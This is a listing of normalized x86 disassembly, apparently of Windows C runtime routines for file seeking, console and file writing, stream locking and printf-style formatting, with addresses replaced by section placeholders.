push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_41c34a
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_41c370
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_427b11
push 0x14
push r--data
call sub_421220
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_41c35d
and [ eax ] 0x0
call sub_41c34a
mov [ eax ] 0x9
call sub_41c35d
and [ eax ] 0x0
call sub_41c34a
mov [ eax ] 0x9
call sub_41efd5
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_421265
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_42a0e5
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_41c34a
mov [ eax ] 0x9
call sub_41c35d
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_427a8c
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_427bf1
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_427bfb
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_429d40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_41c35d
mov [ eax ] edi
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_41ac09
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_41c35d
and [ eax ] 0x0
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
jmp r-xdata
push esi
call sub_428415
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_427a8c
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_41e872
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_41c34a
mov [ eax ] 0x1c
call sub_41c35d
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_41c370
pop ecx
jmp r-xdata
call sub_41c34a
mov [ eax ] 0x9
call sub_41c35d
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_428806
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_42a1ab
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_429cb4
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_429cb4
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_42a1ab
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_4282f8
push 0x10
push r--data
call sub_421220
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_41c35d
and [ eax ] 0x0
call sub_41c34a
mov [ eax ] 0x9
call sub_41c35d
and [ eax ] 0x0
call sub_41c34a
mov [ eax ] 0x9
call sub_41efd5
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_421265
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_42a0e5
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_41c34a
mov [ eax ] 0x9
call sub_41c35d
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_427bfb
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4283c4
mov eax [ ebp - 0x1c ]
sub_4283cc
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_41c229
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_428415
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_41c34a
mov [ eax ] 0x9
call sub_41c34a
mov [ eax ] 0x9
call sub_41efd5
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_428471
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_41c26e
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_41c26e
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_428542
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_4251cf
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_428583
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_4251cf
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_4285b5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_4250f6
pop ecx
pop ebp
retn
sub_4285f1
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_4250f6
pop ecx
pop ebp
retn
sub_428620
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
or eax 0xffffffff
pop ebp
retn
sub_42865c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_41b9dc
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_41c34a
push 0x16
pop esi
mov [ eax ] esi
call sub_41efd5
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_41c34a
mov [ eax ] 0x2a
call sub_41c34a
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_41c34a
push 0x22
pop esi
mov [ eax ] esi
call sub_41efd5
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_41adb0
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_41adb0
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_4287ce
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41b9dc
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_428819
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x250 ]
mov [ ebp - 0x258 ] esi
mov [ ebp - 0x228 ] ebx
mov [ ebp - 0x260 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x238 ] eax
call sub_41b9dc
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
cmp [ ebp - 0x244 ] 0x0
je r-xdata
xor esi esi
cmp edi esi
je r-xdata
push esi
call sub_428620
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ edi ]
mov [ ebp - 0x224 ] esi
mov [ ebp - 0x220 ] esi
mov [ ebp - 0x240 ] esi
mov [ ebp - 0x254 ] esi
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
leave
retn
cmp [ ebp - 0x244 ] 0x0
je r-xdata
inc edi
mov [ ebp - 0x23c ] edi
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x240 ] 0x0
je r-xdata
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp [ ebp - 0x240 ] 0x7
jne r-xdata
xor eax eax
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
push 0x7
pop ecx
cmp eax ecx
ja r-xdata
mov ecx [ ebp - 0x240 ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
push 0x8
shr eax 0x4
pop esi
mov [ ebp - 0x240 ] eax
cmp eax esi
je r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov edi [ ebp - 0x23c ]
mov al [ edi ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + jump_table_4293c9 ]
mov ebx [ ebp - 0x228 ]
xor esi esi
mov dl al
jmp r-xdata
xor eax eax
or [ ebp - 0x218 ] 0xffffffff
mov [ ebp - 0x26c ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
and [ ebp - 0x218 ] 0x0
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
and [ ebp - 0x238 ] 0x0
lea eax [ ebp - 0x250 ]
push eax
movzx eax dl
push eax
call sub_4287ce
pop ecx
test eax eax
mov al [ ebp - 0x211 ]
pop ecx
je r-xdata
movsx eax dl
cmp eax 0x64
jg r-xdata
or [ ebp - 0x210 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x234 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x234 ] eax
jmp r-xdata
add ebx 0x4
mov [ ebp - 0x228 ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x234 ] ebx
test ebx ebx
jns r-xdata
mov eax [ ebp - 0x218 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
add ebx 0x4
mov [ ebp - 0x228 ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x218 ] ebx
test ebx ebx
jns r-xdata
mov al [ edi ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
mov ecx [ ebp - 0x258 ]
lea esi [ ebp - 0x224 ]
call sub_41f827
jmp r-xdata
mov ecx [ ebp - 0x258 ]
lea esi [ ebp - 0x224 ]
call sub_41f827
mov al [ edi ]
inc edi
mov [ ebp - 0x23c ] edi
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x210 ] 0x4
neg [ ebp - 0x234 ]
jmp r-xdata
or [ ebp - 0x218 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x210 ] 0x20
jmp r-xdata
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x210 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ edi + 0x1 ] 0x32
jne r-xdata
add edi 0x2
or [ ebp - 0x210 ] 0x8000
mov [ ebp - 0x23c ] edi
jmp r-xdata
cmp [ edi ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov ecx [ ebp - 0x218 ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x218 ] esi
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add ebx esi
mov eax [ ebx - 0x8 ]
mov edx [ ebx - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
add edi 0x2
and [ ebp - 0x210 ] 0xffff7fff
mov [ ebp - 0x23c ] edi
jmp r-xdata
or [ ebp - 0x210 ] 0x10
jmp r-xdata
inc edi
or [ ebp - 0x210 ] 0x1000
mov [ ebp - 0x23c ] edi
jmp r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
add ebx 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x228 ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x21c ] ebx
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x220 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x220 ] 0x10
je r-xdata
cmp [ ebp - 0x25c ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add ebx 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x228 ] ebx
mov [ ebp - 0x260 ] ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x210 ] esi
jmp r-xdata
cmp al 0x6f
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x260 ] 0x27
mov ecx [ ebp - 0x210 ]
test ecx 0x8000
je r-xdata
mov al [ ebp - 0x260 ]
